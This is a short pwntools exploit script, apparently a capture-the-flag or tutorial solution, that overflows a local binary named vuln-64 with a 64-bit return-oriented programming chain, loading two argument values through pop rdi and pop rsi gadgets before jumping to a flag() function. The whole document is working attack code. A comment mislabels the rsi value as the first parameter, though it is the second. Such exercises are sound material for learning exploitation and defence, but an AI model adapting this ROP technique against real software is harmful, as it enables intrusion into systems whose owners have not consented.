from pwn import *

p = process('./vuln-64')

POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9


payload = b'A' * 56            # Padding
payload += p64(POP_RDI)        # pop rdi; ret
payload += p64(0xdeadc0de)     # value into rdi -> first param
payload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret
payload += p64(0xc0ded00d)     # value into rsi -> first param
payload += p64(0x0)            # value into r15 -> not important
payload += p64(0x40116f)       # Address of flag()
payload += p64(0x0)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
